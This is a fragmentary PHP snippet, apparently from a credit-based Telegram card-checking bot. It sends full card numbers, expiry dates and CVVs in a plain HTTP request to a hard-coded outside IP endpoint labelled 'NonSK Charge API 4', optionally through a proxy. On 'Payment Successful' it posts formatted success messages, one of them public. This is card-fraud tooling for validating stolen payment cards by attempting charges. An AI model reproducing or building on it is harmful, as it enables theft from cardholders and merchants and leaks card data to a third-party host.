...
if ($currentCredits < 2) { // Adjusted to 2 credits for NonSK Charge API 4
...
$requestUrl = "http://51.79.209.54:8004/?cc={$cc}|{$month}|{$year}|{$cvv}";
if ($proxyRequired) {
...
if ((stripos($response, 'Payment Successful') !== false)) {
    ...
    $fullResult =
        ...
        "[ﾒ] <b>Response ➜</b> {$err} 🎉\n" .
        "[ﾒ] <b>Gateway ➜</b> NonSK Charge API 4\n" .
        "━━━━━━━━━━━\n" .
    ...
    $publicMessage =
        ...
        "<b>Response ➜</b> {$err} 🎉\n" .
        "<b>Gateway ➜</b> NonSK Charge API 4\n" .
        "━━━━━━━━\n" .
